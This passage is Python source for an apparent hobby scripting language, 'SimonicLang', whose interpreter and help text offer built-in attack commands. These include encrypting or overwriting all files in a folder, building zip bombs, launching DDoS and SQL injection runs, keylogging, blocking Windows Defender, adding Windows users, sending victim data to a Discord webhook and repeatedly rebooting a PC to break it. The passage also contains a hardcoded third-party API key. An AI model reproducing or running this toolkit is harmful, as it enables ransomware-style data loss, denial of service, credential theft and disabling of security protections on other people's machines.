			value = random.uniform(min, max)
			with lock:
				vars[o[2]] = str(value)
		elif m == "randomsf":
			min = float(fstring(o[0]))
			max = float(fstring(o[1]))
			value = random.uniform(min, max)
			with lock:
				vars[fstring(o[2])] = str(value)
		elif m == "dcwhSend":
			url = o[0]
			text = ";".join(o[1:])
			discordWHSend(url, text)
		elif m == "dcwhSendF":
			url = fstring(o[0])
			text = fstring(";".join(o[1:]))
			discordWHSend(url, text)
		elif m == "sysExit":
			sys.exit()
		elif m == "rwLock":
			files = os.listdir()
			key = str(random.randint(1, 99))
			for file in files:
				runCode(f"encrypt;{file};{key}")
			with open(fstring("$<basefile>")+".save", "w") as f:
				f.write(SL_ENCRYPT(key, 5))
		elif m == "rwUnlock":
			files = os.listdir()
			with open(fstring("$<basefile>")+".save", "r") as f:
				key = SL_DECRYPT(f.read(), 5)
			for file in files:
				try:
					runCode(f"decrypt;{file};{key}")
				except:
					pass
		elif m == "loop":
			n = o[0]
			c = ";".join(o[1:])
			if n == "<>":
				while True:
					for h in c.split(" && "):
						runCode(h)
			else:
				for _ in range(int(n)):
					for h in c.split(" && "):
						runCode(h)
		elif m == "loopf":
			n = fstring(o[0])
			c = ";".join(o[1:])
			if n == "<>":
				while True:
					for h in c.split(" && "):
						runCode(h)
			else:
				for _ in range(int(n)):
					for h in c.split(" && "):
						runCode(h)
		elif m == "runPy":
			exec(fstring(ot))
		elif m == "runSL":
			runCode(fstring(ot))
		elif m == "runCmd":
			try:
				subprocess.run(fstring(ot).split(), stdout=output, stderr=output)
			except:
				pass
		elif m == "runHtml":
			threading.Thread(target=runHtml, args=(ot,)).start()
		elif m == "stopHtml":
			with lock:
				htmlflag = False
		elif m == "startHtml":
			with lock:
				htmlflag = True
		elif m == "runShell":
			subprocess.run(fstring(ot).split(), shell=True, check=True)
		elif m == "runPShell":
			subprocess.run("powershell -Command {fstring(ot)}".split())
		elif m == "clearOut":
			try:
				if os.name == "nt":
					subprocess.run("cls", stdout=output, stderr=output)
				else:
					subprocess.run("clear", stdout=output, stderr=output)
			except:
				pass
		elif m == "clearIn":
			with lock:
				output.flush()
				vars = {}
				httpHeaders = {"User-Agent": "SimonicLang", "Accept": "*/*"}
		elif m == "save":
			with open(fstring(ot), "w") as f:
				f.write(json.dumps(vars)+"\n/n/\n"+json.dumps(httpHeaders))
		elif m == "load":
			with open(fstring(ot), "r") as f:
				c = f.read().split("\n/n/\n")
				vars = json.loads(c[0])
				httpHeaders = json.loads(c[1])
		elif m == "filec":
			with open(ot, "w") as f:
				f.write("")
		elif m == "filew":
			with open(o[0], "w") as f:
				f.write(";".join(o[1:]))
		elif m == "filewf":
			with open(fstring(o[0]), "w") as f:
				f.write(fstring(";".join(o[1:])))
		elif m == "filer":
			with open(o[0], "r") as f:
				vars[o[1]] = f.read()
		elif m == "filerf":
			with open(fstring(o[0]), "r") as f:
				vars[fstring(o[1])] = fstring(f.read())
		elif m == "filed":
			name = fstring(o[0])
			with open(name, "w") as f:
				f.write("")
			os.rename(name, name+".trash")
			os.remove(name+".trash")
		elif m == "thread":
			ott = ";".join(o[1:])
			for _ in range(int(o[0])):
				t = threading.Thread(target=runCode, args=(ott,))
				t.start()
				with lock:
					ts.append(t)
		elif m == "threadjoin":
			for t in ts:
				t.join()
			with lock:
				ts = []
		elif m == "webOpen":
			webbrowser.open(ot)
		elif m == "simonddos":
			type = o[0]
			with lock:
				target = o[1]
				port = int(o[2])
			try:
				size = int(o[3])
			except:
				size = 1024
			try:
				pernum = int(o[4])
			except:
				pernum = 2
			try:
				filename = o[5]
			except:
				filename = "log.txt"
			startddos(type, size, pernum, filename)
		elif m == "simonddos.stop":
			with lock:
				flag = False
				ddospool.stop()
			orinto(ot)
		elif m == "sqlinjectionRun":
			target = o[0]
			pathname = o[1]
			variable = o[2]
			try:
				filename = o[3]
			except:
				filename = "log.txt"
			sqlinjectrun(target, pathname, variable, filename)
		elif m == "netInfo":
			ip = o[0]
			try:
				ip = socket.gethostbyname(ip)
			except:
				pass
			varname = o[1]
			with lock:
				vars[str(varname)] = json.dumps(netinfo(ip))
		elif m == "whois":
			target = fstring(o[0])
			varname = fstring(o[1])
			try:
				if 0 in mods:
					pass
				else:
					subprocess.run("pip install requests".split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
					with lock:
						mods.append(0)
				import requests
				dataa = requests.get(f"https://api.api-ninjas.com/v1/whois?domain="+target, headers={"X-Api-Key": "LypBBv2goWQ1DT1I3LuvRA==qapA26TtpexoaUsJ"}).json()
			except:
				dataa = {}
			with lock:
				vars[str(varname)] = json.dumps(dataa)
		elif m == "netIp":
			target = o[0]
			varname = o[1]
			try:
				ip = socket.gethostbyname(target)
			except:
				ip = "0.0.0.0"
			with lock:
				vars[varname] = str(ip)
		elif m == "netHost":
			ip = o[0]
			try:
				ip = socket.gethostbyname(ip)
			except:
				pass
			varname = o[1]
			try:
				host = socket.gethostbyaddr(ip)[0]
			except:
				host = ""
			with lock:
				vars[varname] = str(host)
		elif m == "hackUser":
			hackUserSystem(o[0], o[1])
		elif m == "hackFiles":
			for file in os.listdir():
				with open(file, "w") as f:
					f.write(fstring(ot))
		elif m == "bufferOverFlow":
			threading.Thread(target=bof, args=(float(fstring(ot)),)).start()
		elif m == "httpSend":
			target = fstring(o[0])
			port = int(fstring(o[1]))
			met = fstring(o[2])
			op = fstring(o[3])
			pack = f"{met} {op} HTTP/1.1\r\nHost: {target}:{port}\r\n"
			for header, value in httpHeaders.items():
				pack += f"{header}: {value}\r\n"
			pack += "\r\n"
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.settimeout(0.8);s.connect((target, port));s.sendall(pack.encode())
			except:
				pass
			s.close()
		elif m == "httpSendR":
			target = fstring(o[0])
			port = int(fstring(o[1]))
			met = fstring(o[2])
			op = fstring(o[3])
			varname = fstring(o[4])
			pack = f"{met} {op} HTTP/1.1\r\nHost: {target}:{port}\r\n"
			for header, value in httpHeaders.items():
				pack += f"{header}: {value}\r\n"
			pack += "\r\n"
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.settimeout(0.8);s.connect((target, port));s.sendall(pack.encode())
				r = ""
				while True:
					try:
						rr = s.recv(65535).decode()
						r += rr
					except:
						break
			except:
				r = ""
			s.close()
			with lock:
				vars[varname] = str(r)
		elif m == "proxyGet":
			url = fstring(o[0])
			varname = fstring(o[1])
			recv = proxyGet0(url)
			vars[str(varname)] = str(recv)
		elif m == "cloudGet":
			file = "sml."+fstring(o[0])
			varname = fstring(o[1])
			s = SimonCloud()
			s.get(file)
			with lock:
				vars[str(varname)] = str(s.recv())
		elif m == "cloudSet":
			file = "sml."+fstring(o[0])
			c = fstring(";".join(o[1:]))
			s = SimonCloud()
			s.set(file, c)
			a = str(s.recv())
			if a == "error":
				if errors:
					orint("error")
		elif m == "randomChc":
			varname = fstring(o[0])
			vars[str(varname)] = random.choice(o[1:])
		elif m == "httpSendRD":
			target = fstring(o[0])
			port = int(fstring(o[1]))
			met = fstring(o[2])
			op = fstring(o[3])
			varname = fstring(o[4])
			pack = f"{met} {op} HTTP/1.1\r\nHost: {target}:{port}\r\n"
			for header, value in httpHeaders.items():
				pack += f"{header}: {value}\r\n"
			pack += "\r\n"
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.settimeout(0.8);s.connect((target, port));s.sendall(pack.encode())
				r = ""
				while True:
					try:
						rr = s.recv(65535).decode()
						r += rr
					except:
						break
				r = r.split("\r\n\r\n")[1]
			except:
				r = ""
			s.close()
			with lock:
				vars[varname] = str(r)
		elif m == "httpHead":
			header = fstring(o[0])
			value = fstring(";".join(o[1:]))
			with lock:
				httpHeaders[header] = value
		elif m == "httpHeadR":
			header = fstring(o[0])
			with lock:
				del httpHeaders[header]
		elif m == "math":
			option = fstring(o[0])
			varname = fstring(o[1])
			value = str(eval(option))
			with lock:
				vars[varname] = str(value)
		elif m == "randomAPI":
			length = int(fstring(o[0]))
			varname = fstring(o[1])
			vars[varname] = str(secrets.token_hex(length))
		elif m == "zipbomb":
			name = o[0]
			mb = int(o[1])
			names = []
			for _ in range(mb):
				n = ""
				for _ in range(32):
					n += random.choice("q w e r t y u i o p a s d f g h j k l z x c v b n m 1 2 3 4 5 6 7 8 9 0".split(" "))
				with open(n, "w") as f:
					f.write("."+(" "*1024*1024))
				names.append(n)
			import zipfile
			with zipfile.ZipFile(name, "w") as f:
				for n in names:
					f.write(n)
					runCode(f"filed;"+n)
		elif m == "IF":
			value1 = fstring(o[0])
			option = fstring(o[1])
			value2 = fstring(o[2])
			code = ot.split(";if=")[1]
			code = code.split(";else=")
			if option == "==":
				if value1 == value2:
					for h in code[0].split(" && "):
						runCode(h)
				else:
					for h in code[1].split(" && "):
						runCode(h)
			elif option == ">=":
				if float(value1) >= float(value2):
					for h in code[0].split(" && "):
						runCode(h)
				else:
					for h in code[1].split(" && "):
						runCode(h)
			elif option == "<=":
				if float(value1) <= float(value2):
					for h in code[0].split(" && "):
						runCode(h)
				else:
					for h in code[1].split(" && "):
						runCode(h)
			elif option == ">":
				if float(value1) > float(value2):
					for h in code[0].split(" && "):
						runCode(h)
				else:
					for h in code[1].split(" && "):
						runCode(h)
			elif option == "<":
				if float(value1) < float(value2):
					for h in code[0].split(" && "):
						runCode(h)
				else:
					for h in code[1].split(" && "):
						runCode(h)
			else:
				for h in code[1].split(" && "):
					runCode(h)
		elif m == "fstr":
			runCode(fstring(ot))
		elif m == "loadAllMods":
			loadAllMods()
		elif m == "help":
			print("fstr;code... = Use any command with f-string")
			print("loadAllMods = load all extension mods (psutil/fake_useragent/datetime/requests/keyboard/tkinter)")
			print("log;text... = Write a text to output")
			print("logf;text... = Write a text to output with f-string")
			print("optilog;text... = Write a text to output (Optimum)")
			print("optilogf;Your number: $<v.number> = Write a text to output with f-string (Optimum)")
			print("outNone = Disable output")
			print("outSys = Activate output")
			print("returnAuto;file.sl = SimonicLang file to Python file (f-string)")
			print("returnPyExe;file.py = Python file to Exe file")
			print("returnPyHideExe;file.py = Python file to Exe file without console (f-string)")
			print("returnSLExe;file.sl;addByte(optional) = SimonicLang file to Exe file (f-string) (addByte=It is a value you can use to increase the file size. Use this value as the number of characters, otherwise nothing will happen.)")
			print("returnSLHideExe;file.sl;addByte(optional) = SimonicLang file to Exe file without console (f-string) (addByte=It is a value you can use to increase the file size. Use this value as the number of characters, otherwise nothing will happen.)")
			print("eSet;on = Activate errors")
			print("eSet;off = Disable errors")
			print("vSet;varname;value... = Creates or seting some variable")
			print("vSetF;varname;value... = Creates or seting some variable (with value f-string)")
			print("vSetFF;varname;value... = Creates or seting some variable (with value and name f-string)")
			print("vR;varname = Remove a variable")
			print("vRF;varname = Remove a variable (with name f-string)")
			print("input;varname;text... = Input system")
			print("inputf;varname;text... = Input system (with f-string)")
			print("serverCalculate;ports;trueLevel;varname = Calculate how much servers in the world (e.g. serverCalculate;80,443;10;example)")
			print("%;num1;num2;varname = Calculate the percentage of num1 to the num2 and save to variable(f-string)")
			print("random;min;max;varname = Generates random number")
			print("randomf;min;max;varname = Generates random number (with f-string)")
			print("randomw;min;max;varname = Generates random uniform number")
			print("randomsf;min;max;varname = Generates random uniform number (with f-string)")
			print("rwLock = Encrypt all files")
			print("rwUnlock = Decrypt all files")
			print("setRoot;filename... = Gives root permissions to file (with f-string) (0o777)")
			print("blockPerms;filename... = Block the permissions of file (with f-string) (0)")
			print("taskkill;pid... = Stop the task (with f-string)")
			print("tasklist;varname... = get task list (f-string)")
			print("taskblock;name... = block the tasks with program name/path (f-string)")
			print("blockDefender = Block antivirus programs (Windows defender...)")
			print("winUserAdd;username;password = Windows user adding (with f-string)")
			print("shutdown = Shutdown PC for Windows/Linux/Shell")
			print("reboot = Reboot/Restart PC For Windows/Linux/Shell")
			print("brokePc = It tries to shut down and restart the computer hundreds of times, which completely destroys the computer and may not be usable at all (Extremely Dangerous)")
			print("wait;number... = Wait seconds (time sleep)")
			print("keylog;varname = Key logging and saves to variable")
			print("encrypt;filename;password = Encrypt file with SimonicLang Crypto")
			print("decrypt;filename;password = Decrypt file with SimonicLang Crypto")
			print("cloudGet;filename;varname = Get content from SimonCloud (with f-string)")
			print("sendBotMail;target;subject;mes... = Send E-Mail with SimonicLang free bot account ( simoniclang@hotmail.com )")
			print("sendMail;serverSmtp;port;account;password;target;subject;mes = Send E-Mail")
			print("cloudSet;filename;content... = Set content from SimonCloud (with f-string)")
			print("randomChc;varname;list... = Random choice from list (with f-string) (list e.g. apple;melon;code)")
			print("bufferOverFlow;number... = It initiates an ordinary buffer over flow attack, waits for the entered value a while, and also runs in the background (with f-string)")
			print("dcwhSendF;url;text... = Send a text to Discord Webhook (with f-string)")
			print("dcwhSend;url;text... = Send a text to Discord Webhook")
			print("sysExit = System Exit")
			print("errorBox;text... = Show error box (f-string)")
			print("whois;target;varname... = Search info with whois (f-string)")
			print("loop;option;code... = Looping (options: <> While or number to normal loop)")
			print("loopf;option;code... = Looping (options: <> While or number to normal loop) (with f-string)")
			print("runPy;code... = Run Python Code (with f-string)")
			print("runSL;code... = Run SimonicLang Code (with f-string)")
			print("runCmd;command... = Run os command (with f-string)")
			print("runHtml;htmlcode... = Run html with web browser server (with f-string)")
			print("stopHtml = Stop html web browser servers")
			print("startHtml = Start html web browser servers")
			print("runShell;command... = Run Shell Command (with f-string)")
			print("runPShell;command... = Run PowerShell Command (with f-string)")
			print("clearOut = Clear outputs")
			print("clearIn = Clear and reset in system")
			print("proxyGet;url;varname = Get website content with random proxy (with f-string)")
			print("webOpen;url... = Open web page with user's browser (with f-string)")
			print("save;filename = Save variables and all")
			print("load;filename = Load variables and all")
			print("filec;filename = Create file")
			print("filew;filename;content... = Write content to file")
			print("filewf;filename;content... = Write content to file (with f-string)")
			print("filer;filename;varname = Open file and write comtent to variable")
			print("filerf;filename;varname = Open file and write comtent to variable (with f-string)")
			print("filed;filename = Delete file (with f-string) (It destroys beyond reach and is also very fast.)")
			print("zipbomb;filename;mbsize = Creates ZipBomb File (A file that is high in size but appears small and crashes the machine when opened)")
			print("thread;code... = Start code with threading")
			print("threadjoin = Join all threads")
			print("simonddos;tcp/udp;target;port;size(optional);pernum(optional);logfilename(optional) = Start a Simon's Ddos")
			print("randomAPI;hexlength;varname = Random API Key Creator")
			print("simonddos.stop = Stop Simon's Ddos")
			print("sqlinjectionRun;target;pathname;variable(url);filename(optional) = Start SQL Injection Project")
			print("netInfo;ip/dns;varname = Get all internet info from ip/dns")
			print("netIp;dns;varname = Get ip info from dns")
			print("netHost;ip;varname = Get host/dns from ip")
			print("hackUser;url;logtitle = Hack the code starter and send info to Discord Webhook address")
			print("hackFiles;content... = gives a specific content to all files in the folder")
			print("httpSend;target;port;method;path/option = HTTP Request Sending (with f-string)")
			print("httpSendR;target;port;method;path/option;varname = HTTP Request Sending and get all recv write to variable (with f-string)")
			print("httpSendRD;target;port;method;path/option;varname = HTTP Request Sending and get only data recv write to variable (with f-string)")
			print("httpHead;header;value... = Set or create a http header (with f-string)")
			print("httpHeadR;header = Remove http header (with f-string)")
			print("math;option;varname = Start math progress and output writes to variable (with f-string)")
			print("IF;value1;option;value2;if=trueCode...;else=falseCode... = Start if progress (with f-string)")
			print("help = Help for SimonicLang")
			print("How to use F-String? (this process dont have mathing):")
			print("$<n> = Newline")
			print("$<c.reset/red/green/yellow/blue/purple/blue2/white/black/gray> = Change text colors (Ascii Color Codes)")
			print("$<bold> = Change text to bold text (use c.reset for disable)")
			print("$<smlangUrl> = Display SimonicLang Github link")
			print("$<v.varname> = Geting variable value")
			print("$<vup.varname> = Geting variable value with upper charset")
			print("$<vlow.varname> = Geting variable value with lower charset")
			print("$<vlen.varname> = Geting variable string value length")
			print("$<fakeUA> = Create random fake user agent")
			print("$<random.ip> = Random created fake ip")
			print("$<random.apikey.16/32/64/128> = Random API Key")
			print("$<random.server> = Random Real Server IP:PORT (Server Finder)")
			print("$<basefile> = Base code file")
			print("$<sys.name> = Os's name")
			print("$<sys.sys> = System name")
			print("$<sys.ver> = System version")
			print("$<sys.node> = System node")
			print("$<sys.user> = Os's Username")
			print("$<sys.user2> = Get Os's Username with getpass")
			print("$<sys.path> = Base path")
			print("$<sys.prcsr> = System processor")
			print("$<sys.pyver> = Python version")
			print("$<sys.slver> = SimonicLang version")
			print("$<sys.mac> = System machine")
			print("$<sys.arch> = System architecture")
			print("$<sys.ip> = Machine's IP Address")
			print("$<sys.host> = Machine's Host/DNS Address")
			print("$<ram.b/kb/mb/gb> = Display RAM deposit")
			print("$<ramav.b/kb/mb/gb> = Display RAM Avaible deposit")
			print("$<ramus.b/kb/mb/gb> = Display RAM Uses deposit")
			print("$<prcsc> = System Process count")
			print("$<date> = Get all date info")
			print("$<all> = Get all system info (without date)")
			print("Example Code:")
			print("""log;Hello World!$<n>
logf;$<c.red>This text is red!$<c.reset>$<n>
vSet;loopNum;0
loop;5;math;$<v.loopNum>+1;loopNum && inputf;cmd;This your is $<v.loopNum>. Command:  && runCmd;$<v.cmd>
input;chc;Show Date? (Y/n):
IF;$<vlow.chc>;==;y;if=logf;Yeah its date! $<date>;else=log;Okey we dont write date!
log;$<n>
optilog;This is Optimizated Output!$<n>
optilogf;User Info:$<n>Name: $<sys.user>$<n>RAM: $<ram.gb> GB$<n>IP and HOST: $<sys.ip> $<sys.host>$<n>
optilog;Random Server finding...$<n>
optilogf;Finded Random Server: $<random.server>$<n>""")
	except Exception as e:
		if errors:
			orint(str(e))






# Compiler:
if len(sys.argv) >= 2:
	name = sys.argv[1]
	with open(name, "r") as f:
		c = f.read()
	for h in c.split("\n"):
		for hh in h.split(" %& "):
			runCode(hh)
else:
	print(f"SimonicLang v1.0.2 (by aertsimon90)-Powered By Python")
	while True:
		a = input("\n>>> ")
		for hh in a.split(" %& "):
			runCode(hh)
